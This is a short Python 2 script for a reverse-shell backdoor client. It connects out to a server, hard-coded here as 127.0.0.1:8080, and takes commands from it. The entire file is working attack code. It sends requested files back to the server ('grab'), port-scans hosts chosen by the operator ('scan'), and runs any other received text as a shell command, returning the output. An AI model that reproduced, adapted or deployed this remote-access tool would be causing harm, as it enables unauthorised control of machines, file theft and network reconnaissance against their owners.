import socket
from subprocess import PIPE, Popen
import os

SERVER_IP = '127.0.0.1'
SERVER_PORT = 8080

def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE')
        f.close()
    else:
        s.send('Unable to find out the file')

def scanner(s,ip,ports):
    scan_result = ''
    for port in ports.split(','):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            output = sock.connect_ex((ip, int(port)))
            if output == 0:
                scan_result = scan_result + '[+] Port ' + port + ' is opened' + '\n'
            else:
                scan_result = scan_result + '[-] Port ' + port + ' is closed or Host ' + ip + ' is not Reachable' + '\n'
            sock.close()
        except Exception, e:
            pass
    s.send(scan_result)

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP, SERVER_PORT))
    while True:
        command = s.recv(1024)
        if 'terminate' in command:
            s.close()
            break
        elif 'grab' in command:
            grab,path = command.split('*')
            try:
                transfer(s,path)
            except Exception,e:
                s.send(str(e))
                pass
        elif 'scan' in command:
            command = command[5:]
            ip,ports = command.split(':')
            scanner(s,ip,ports)
        else:
            CMD = Popen(command, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())

def main():
    connect()
main()
